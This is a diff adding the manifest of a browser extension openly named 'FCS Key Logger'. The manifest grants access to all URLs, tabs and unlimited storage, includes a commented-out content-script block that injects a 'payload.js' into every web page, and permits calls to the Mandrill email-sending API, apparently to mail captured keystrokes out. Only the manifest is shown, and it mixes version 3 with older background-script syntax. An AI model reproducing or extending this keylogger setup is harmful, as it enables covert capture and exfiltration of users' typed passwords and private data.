@@ -1,0 +1,34 @@
+{
+  "name": "FCS Key Logger",
+  "version": "0.0.0",
+  "manifest_version": 3,
+  "description": "FCS keylogger",
+
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "options_page": "src/options/index.html",
+  "background": {
+    "scripts": ["src/inject/inject.js"]
+  },
+  // "content_scripts": [
+  //   {
+  //     "matches": ["http://*/*", "https://*/*"],
+  //     "js": ["src/inject/payload.js","src/inject/inject.js"],
+  //     "run_at": "document_end"
+  //   }
+  // ],
+  "permissions": [
+    "https://mandrillapp.com/api/1.0/messages/send.json",
+    "<all_urls>",
+    "tabs",
+    "storage",
+    "unlimitedStorage",
+    "https://ssl.gstatic.com/",
+    "https://www.googleapis.com/",
+    "https://accounts.google.com/",
+    "http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"
+  ]
+}
